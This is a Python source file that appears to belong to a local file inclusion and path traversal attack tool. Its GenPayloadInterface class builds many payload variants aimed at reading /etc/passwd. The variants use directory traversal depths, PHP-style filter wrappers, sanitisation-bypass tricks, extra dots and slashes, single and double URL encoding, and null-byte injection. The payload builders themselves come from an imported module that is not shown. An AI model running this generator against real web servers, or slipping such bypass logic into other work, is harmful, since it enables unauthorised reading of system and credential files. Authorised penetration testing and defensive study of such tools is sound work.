from .gen_payload import Payload
from .prints import prints

from copy import copy

class GenPayloadInterface:
    """
    Creates a dictionary of payloads
    Looking at the code is going to make it hard to understand.
    This class creates a list of payload object with the gen function
    Then we create a copy of each object then just perform another action on it
    Be careful this is quite exponential.
    """
    def __init__(self, local_file="/etc/passwd", search_term="root:x:0", max_depth=10):

        self.local_file = local_file
        self.search_term = search_term
        self.directory_traversal_length = max_depth
        self.extra_dots = 0
        self.extra_slashes = 0
        self.payload_list = []

    def gen_all(self):
        """Generates all payloads for a target"""
        self.gen_root()
        self.gen_dir_tran()
        self.gen_filter()
        self.gen_replace_tran()
        self.gen_unique_slash()
        self.gen_unique_dot()
        self.gen_unique_url_encode()
        self.gen_unique_null_byte()
        self.payload_count()

    def gen_root(self):
        pay = Payload(self.local_file, self.search_term)
        pay.root_file()
        self.payload_list.append(pay)

    def gen_dir_tran(self):
        for dirs in range(0, self.directory_traversal_length):
            pay = Payload(self.local_file, self.search_term)
            pay.directory_traversal(dirs)
            self.payload_list.append(pay)

    def gen_filter(self):
        new_payload_list = []
        for current_payload in self.payload_list:
            new_payload = copy(current_payload)
            new_payload.enable_filter_wrapper()
            new_payload_list.append(new_payload)
        self.add_new_payload(new_payload_list)

    def gen_replace_tran(self):
        new_payload_list = []
        for current_payload in self.payload_list:
            new_payload = copy(current_payload)
            if new_payload.sanitation_bypass_replace_tran():
                new_payload_list.append(new_payload)
        self.add_new_payload(new_payload_list)

    def gen_unique_dot(self):
        new_payload_list = []
        for current_payload in self.payload_list:
            for dots in range(3, self.extra_dots):
                new_payload = copy(current_payload)
                if new_payload.sanitation_bypass_extra_dot(dots):
                    new_payload_list.append(new_payload)
                else:
                    pass
        self.add_new_payload(new_payload_list)

    def gen_unique_slash(self):
        new_payload_list = []
        for slash in range(2, self.extra_slashes + 1):
            for current_payload in self.payload_list:
                new_payload = copy(current_payload)
                if new_payload.extra_slashes != 0:
                    continue
                else:
                    if new_payload.sanitation_bypass_extra_slash(slash):
                        new_payload_list.append(new_payload)
        self.add_new_payload(new_payload_list)

    def gen_unique_url_encode(self):
        new_payload_list = []
        for current_payload in self.payload_list:
            if not current_payload.url_encode and not current_payload.url_dbl_encode:
                new_payload_single = copy(current_payload)
                if new_payload_single.sanitation_bypass_url_encode():
                    new_payload_list.append(new_payload_single)

                new_payload_double = copy(current_payload)
                if new_payload_double.sanitation_bypass_dbl_url_encode():
                    new_payload_list.append(new_payload_double)

        self.add_new_payload(new_payload_list)

    def gen_unique_null_byte(self):
        new_payload_list = []
        for current_payload in self.payload_list:
            if not current_payload.null_byte:
                new_payload = copy(current_payload)
                if new_payload.null_byte_injection():
                    new_payload_list.append(new_payload)
        self.add_new_payload(new_payload_list)

    def add_new_payload(self, payload_list):
        for payload in payload_list:
            self.payload_list.append(payload)

    def show_all_payload_messages(self):
        """Debug method"""
        for pay in self.payload_list:
            prints(pay.payload)
            message = pay.gen_payload_message()
            for lines in message.split("\n"):
                prints(lines)
            prints("")

    def payload_count(self):
        tot_n_payloads = len(self.payload_list)
        prints(f"Total number of payloads generated:\t {tot_n_payloads}")

    def get_payload_list(self):
        return self.payload_list
